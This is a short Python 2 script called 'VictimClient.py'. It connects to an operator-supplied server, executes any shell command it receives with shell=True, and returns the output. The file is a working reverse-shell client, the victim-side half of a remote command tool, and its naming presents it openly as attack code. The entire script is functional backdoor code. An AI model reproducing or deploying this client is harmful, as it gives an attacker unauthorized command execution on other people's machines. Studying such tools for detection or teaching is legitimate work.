import subprocess
import socket
import argparse

def usage():
  print
  print "Examples:"
  print "python VictimClient.py -a localhost -p 5555"
  exit(0)


def execute_command(cmd):
  cmd = cmd.rstrip()

  try:
    # to execute cmd local, capture stout and use default shell
    results = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
  except Exception, e:
    results = "Could not execute the command: " + cmd

  return results


def receive_data(client):
  try:
    while True:
      received_cmd = ""
      received_cmd += client.recv(4096)

      if not received_cmd:
        continue

      cmd_results = execute_command(received_cmd)

      client.send(cmd_results)
  except Exception, e:
    print str(e)
    pass


def client_connect(host,port):
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  try:
    client.connect((host,port))
    print "Connected with the server " + host + " at port number " + str(port)
    receive_data(client)
  except Exception, e:
    print str(e)
    client.close()


def main():
  parser = argparse.ArgumentParser('Victin client commander')
  parser.add_argument("-a","--address", type=str, help="The Server IP address")
  parser.add_argument("-p","--port", type=int, help="The port to cennect with", default=5555)

  args = parser.parse_args()

  if args.address == None:
    usage()

  target_host = args.address
  port_number = args.port

  client_connect(target_host, port_number)


if __name__ == '__main__':
  main()
   

